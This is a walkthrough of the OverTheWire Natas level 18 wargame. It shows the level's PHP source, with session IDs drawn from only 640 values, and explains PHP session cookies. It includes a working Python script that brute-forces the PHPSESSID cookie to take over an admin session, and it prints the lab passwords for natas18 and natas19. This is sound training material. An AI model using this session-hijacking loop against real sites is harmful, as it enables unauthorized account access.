## Level17 -> Level18


A username,password form and a login button is given. 


Here is the source code. 


```php
<?php

$maxid = 640; // 640 should be enough for everyone

function isValidAdminLogin() { /* {{{ */
    if($_REQUEST["username"] == "admin") {
    /* This method of authentication appears to be unsafe and has been disabled for now. */
        //return 1;
    }

    return 0;
}
/* }}} */
function isValidID($id) { /* {{{ */
    return is_numeric($id);
}
/* }}} */
function createID($user) { /* {{{ */
    global $maxid;
    return rand(1, $maxid);
}
/* }}} */
function debug($msg) { /* {{{ */
    if(array_key_exists("debug", $_GET)) {
        print "DEBUG: $msg<br>";
    }
}
/* }}} */
function my_session_start() { /* {{{ */
    if(array_key_exists("PHPSESSID", $_COOKIE) and isValidID($_COOKIE["PHPSESSID"])) {
    if(!session_start()) {
        debug("Session start failed");
        return false;
    } else {
        debug("Session start ok");
        if(!array_key_exists("admin", $_SESSION)) {
        debug("Session was old: admin flag set");
        $_SESSION["admin"] = 0; // backwards compatible, secure
        }
        return true;
    }
    }

    return false;
}
/* }}} */
function print_credentials() { /* {{{ */
    if($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1) {
    print "You are an admin. The credentials for the next level are:<br>";
    print "<pre>Username: natas19\n";
    print "Password: <censored></pre>";
    } else {
    print "You are logged in as a regular user. Login as an admin to retrieve credentials for natas19.";
    }
}
/* }}} */

$showform = true;
if(my_session_start()) {
    print_credentials();
    $showform = false;
} else {
    if(array_key_exists("username", $_REQUEST) && array_key_exists("password", $_REQUEST)) {
    session_id(createID($_REQUEST["username"]));
    session_start();
    $_SESSION["admin"] = isValidAdminLogin();
    debug("New session started");
    $showform = false;
    print_credentials();
    }
}

if($showform) {
?>

<p>
Please login with your admin account to retrieve credentials for natas19.
</p>

<form action="index.php" method="POST">
Username: <input name="username"><br>
Password: <input name="password"><br>
<input type="submit" value="Login" />
</form>
<?php } ?>
```


If you inspect the source code, you get the password when `$_SESSION` exists and when `$_SESSION["admin"]==1` you'll get the password. 


```php
function print_credentials() { /* {{{ */
    if($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1) {
    print "You are an admin. The credentials for the next level are:<br>";
    print "<pre>Username: natas19\n";
    print "Password: <censored></pre>";
    } else {
    print "You are logged in as a regular user. Login as an admin to retrieve credentials for natas19.";
    }
}
```


Since the `PHPSESSID` is a number between 1 ~ 640 you only need to guess `640` times.


What exactly is a **PHPSESSID**?


Whenever you first visit a website that is built from php, the server gives your browser a unique ID which is the `PHPSESSID`.


Your browser via a cookie uses this `PHPSESSID` every time it interacts with this site. 


Whenever you click on a new link, the server will recognize you from your `PHPSESSID`, without it the server would treat as if it was your first time visiting the website. 


`PHPESSID`s are usually cookies. 


Here are some extra readings to get a better grasp. 


https://www.php.net/manual/en/reserved.variables.session.php


https://stackoverflow.com/questions/1535697/how-do-php-sessions-work-not-how-are-they-used


https://stackoverflow.com/questions/1370951/what-is-phpsessid


In order to get the password we can brute force the `PHPSESSID`.


Using `requests.Session` is much faster than sending a brand new request each time, compare it yourself if you can't believe me.


```python
import requests
from requests.auth import HTTPBasicAuth
import re

USERNAME = 'natas18'
URL = f'http://{USERNAME}.natas.labs.overthewire.org/'
PW = '6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ'
session = requests.Session()
session.auth = HTTPBasicAuth(USERNAME, PW)

for i in range(1, 641):
    cookies = {'PHPSESSID': f'{i}'}
    res = session.post(URL, cookies=cookies)
    print(f'Trying session id: {i}')
    if 'You are an admin' in res.text:
        print(i, res.text)
        print(re.findall('<pre>(.*?)</pre>', res.text, re.DOTALL)[0])
        break

# Username: natas19
# Password: tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr
```


I used the HTTP Post method but using a GET request method is fine as well, both work. 


If you only want nothing more than the password comment out `print(i,res.text)` use the `re` module to `grep` out the password.